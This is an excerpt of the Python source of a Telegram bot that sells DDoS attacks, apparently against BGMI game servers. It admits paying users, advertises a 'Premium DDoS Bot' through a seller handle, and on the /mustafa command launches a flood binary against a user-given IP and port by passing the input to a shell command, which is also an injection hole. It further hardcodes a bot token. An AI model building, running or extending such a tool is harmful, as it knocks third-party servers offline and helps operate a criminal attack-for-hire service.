...
bot = telebot.TeleBot('7829836113:AAEw4z1bIAcf0Zlaf87KcJnLmbEwrOEZgsM')
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "Yᴏᴜ Hᴀᴠᴇ Nᴏᴛ Pᴜʀᴄʜᴀsᴇᴅ Yᴇᴛ Pᴜʀᴄʜᴀsᴇ Nᴏᴡ:- @SIDIKI_MUSTAFA_92."
...
✅ Usage: /remove <userid>'''
        ...
        response = "You have not purchased yet purchase now from:- @SIDIKI_MUSTAFA_92 🙇."
...
def clear_users_command(message):
    ...
    if user_id in admin_id:
        ...
        response = "Fʀᴇᴇ Kᴇ Dʜᴀʀᴍ Sʜᴀʟᴀ Hᴀɪ Yᴀ Jᴏ Mᴜ Uᴛᴛʜᴀ Kᴀɪ Kʜɪ Bʜɪ Gᴜꜱ Rʜᴀɪ Hᴏ Bᴜʏ Kʀᴏ Fʀᴇᴇ Mᴀɪ Kᴜᴄʜ Nʜɪ Mɪʟᴛᴀ Bᴜʏ:- @SIDIKI_MUSTAFA_92 🙇."
    bot.reply_to(message, response)
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of @SIDIKI_MUSTAFA_92"
    bot.reply_to(message, response)
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 180:
                ...
                full_command = f"./mustafa {target} {port} {time} 1300"
                process = subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "𝐃𝐄𝐀𝐑 𝐔𝐒𝐄𝐑. 🧨\n\n𝐔𝐒𝐀𝐆𝐄 /mustafa < 𝐈𝐏 > < 𝐏𝐎𝐑𝐓 > < 𝐓𝐈𝐌𝐄 >\n\n𝙁𝙊𝙍 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 :-> /mustafa 20.0.0.0 10283 100\n\n𝘿𝙊𝙉'𝙏 𝙎𝙋𝘼𝙈 ⚠️‼️\nᴛʜɪs ʙᴏᴛ ᴏᴡɴᴇʀ ❤️‍🩹:--> @SIDIKI_MUSTAFA_92"  # Updated command syntax
    else:
...
def welcome_start(message):
    ...
    response = f'''❄️Wᴇʟᴄᴏᴍᴇ Tᴏ Pʀᴇᴍɪᴜᴍ Dᴅᴏs Bᴏᴛ, {user_name}! Tʜɪs Is Hɪɢʜ Qᴜᴀʟɪᴛʏ Sᴇʀᴠᴇʀ Bᴀsᴇᴅ Dᴅᴏs Tᴏ Gᴇᴛ Aᴄᴄᴇss.
🤖Tʀʏ Tᴏ Rᴜɴ Tʜɪs Cᴏᴍᴍᴀɴᴅ : /help 
✅Bᴜʏ :- @SIDIKI_MUSTAFA_92'''
    bot.reply_to(message, response)
...
def remove_expired_users():
    while True:
        current_time = datetime.datetime.now()
        expired_users = [user_id for user_id, expiry in user_approval_expiry.items() if expiry < current_time]

        for user_id in expired_users:
            if user_id in allowed_user_ids:
                allowed_user_ids.remove(user_id)
                del user_approval_expiry[user_id]
                with open(USER_FILE, "w") as file:
